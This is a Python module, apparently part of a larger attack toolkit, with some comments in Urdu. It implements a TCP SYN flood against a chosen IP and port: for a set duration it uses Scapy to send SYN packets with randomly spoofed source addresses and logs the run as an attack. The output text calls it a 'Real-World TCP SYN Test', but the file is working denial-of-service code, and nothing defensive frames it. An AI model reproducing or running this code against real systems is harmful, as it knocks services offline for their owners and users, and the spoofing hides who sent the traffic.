# modules/tcp_syn.py
import time
import random
from scapy.all import IP, TCP, send
from utils.colors import Colors
from utils.logger import log_attack

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def start_syn_flood(target_ip, target_port, duration):
    log_attack("TCP_SYN_Flood", target_ip, target_port, duration)
    
    timeout = time.time() + duration
    packets_sent = 0
    
    print(Colors.info(f"Launching Real-World TCP SYN Test on {target_ip}:{target_port}"))
    print(Colors.warn("Sending Raw Layer-3/Layer-4 Spoofed Packets...\n"))
    
    while time.time() < timeout:
        try:
            # کسٹم آئی پی اور ٹی سی پی ہیڈر بنانا
            spoofed_source_ip = random_ip()
            random_source_port = random.randint(1024, 65535)
            
            # Scapy کے ذریعے پیکٹ کرافٹنگ
            packet = IP(src=spoofed_source_ip, dst=target_ip) / TCP(sport=random_source_port, dport=target_port, flags="S")
            
            # پیکٹ کو لوپ بیک یا نیٹ ورک کارڈ پر بھیجنا (verbose=0 سے اسکرین پر فالتو آؤٹ پٹ نہیں آتا)
            send(packet, verbose=0)
            packets_sent += 1
            
            if packets_sent % 50 == 0:
                print(f"\r{Colors.success(f'Raw SYN Packets Transmitted: {packets_sent}')}", end="")
        except Exception as e:
            print(f"\n{Colors.error(f'Raw Socket Error: {e}')}")
            break
            
    print(f"\n\n{Colors.success(f'SYN Test Completed. Total Transmitted: {packets_sent}')}")
    time.sleep(2)
  
